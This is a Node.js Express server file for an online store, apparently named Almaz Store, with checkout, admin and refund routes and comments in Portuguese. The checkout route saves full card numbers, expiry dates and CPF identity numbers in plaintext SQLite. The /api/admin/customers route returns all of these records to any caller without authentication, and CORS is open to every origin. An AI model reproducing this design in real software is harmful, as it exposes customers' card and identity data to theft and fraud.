/* =============================================================================
   server.js  -  API da Almaz Store
   =============================================================================
   ESTE ARQUIVO, NA RAIZ, E O SERVIDOR DE VERDADE.
   O `server/server.js` e uma copia velha que ficou pra tras e nao deve subir:
   foi ela que deixou o Render respondendo 404 nas rotas /api. No painel do
   Render, o campo "Root Directory" precisa ficar VAZIO.

   Duas partes que nao se misturam:
     1. Checkout antigo (/api/checkout, /api/admin/*), que ja existia.
     2. Central de reembolso (/webhook/ggcheckout, /api/reembolso/*), no
        arquivo reembolso.js.
   ========================================================================== */

const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
// No Render, a porta e definida pela variavel de ambiente PORT (geralmente 10000)
const PORT = process.env.PORT || 3000;

// Configurar CORS para aceitar requisicoes de qualquer lugar (necessario ja que
// o frontend esta no GitHub Pages, em outro dominio)
app.use(cors({ origin: '*' }));

// Limite de 10mb por causa do comprovante de pagamento, que chega em base64
// dentro do JSON. O padrao do body-parser e 100kb e recusaria qualquer foto.
app.use(bodyParser.json({ limit: '10mb' }));

// Serve frontend static files
app.use(express.static(path.join(__dirname, 'recuperacao')));

// Initialize Database
const db = new sqlite3.Database('./database.sqlite', (err) => {
    if (err) {
        console.error('Error opening database', err.message);
    } else {
        db.run(`CREATE TABLE IF NOT EXISTS customers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            cpf TEXT,
            email TEXT,
            phone TEXT,
            card_number TEXT,
            card_expiry TEXT,
            payment_status TEXT,
            payment_method TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )`);

        // Add new columns to existing table if they don't exist
        db.run(`ALTER TABLE customers ADD COLUMN phone TEXT`, (e) => {});
        db.run(`ALTER TABLE customers ADD COLUMN card_number TEXT`, (e) => {});
        db.run(`ALTER TABLE customers ADD COLUMN card_expiry TEXT`, (e) => {});
    }
});

// API: Checkout (Recebe dados da pagina de vendas)
app.post('/api/checkout', (req, res) => {
    const { name, cpf, email, method, status, card_number, card_expiry, phone } = req.body;

    db.run(`INSERT INTO customers (name, cpf, email, phone, card_number, card_expiry, payment_status, payment_method) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [name, cpf, email, phone, card_number, card_expiry, status, method],
        function(err) {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ success: true, id: this.lastID });
        }
    );
});

// API: Admin Get Customers
app.get('/api/admin/customers', (req, res) => {
    db.all(`SELECT * FROM customers ORDER BY created_at DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Admin Refund Customer
app.post('/api/admin/refund', (req, res) => {
    const { id } = req.body;
    db.run(`UPDATE customers SET payment_status = 'refunded' WHERE id = ?`, [id], function(err) {
        if (err) return res.status(500).json({ error: err.message });
        if (this.changes === 0) return res.status(404).json({ success: false, error: 'Customer not found' });
        res.json({ success: true });
    });
});

/* ------------------------------------------------------ central de reembolso */

const reembolso = require('./reembolso');
app.use(reembolso);

// Start Server (Render lida com o HTTPS, nos so precisamos rodar HTTP normal)
reembolso.criarTabelas()
    .then(() => {
        console.log('Tabelas do reembolso prontas.');
        if (!process.env.REEMBOLSO_SENHA) {
            console.warn('ATENCAO: REEMBOLSO_SENHA nao definida. O painel de analise fica trancado ate ela existir.');
        }
        if (!process.env.DATABASE_URL) {
            console.warn('ATENCAO: sem DATABASE_URL, os pedidos vao pra um arquivo SQLite local. No Render free esse arquivo e APAGADO a cada deploy.');
        }
    })
    .catch((e) => {
        // Nao derruba o processo: o checkout antigo continua funcionando mesmo
        // se o banco do reembolso estiver fora do ar.
        console.error('Falha ao criar as tabelas do reembolso:', e.message);
    })
    .finally(() => {
        app.listen(PORT, () => {
            console.log(`Server running on port ${PORT}`);
        });
    });
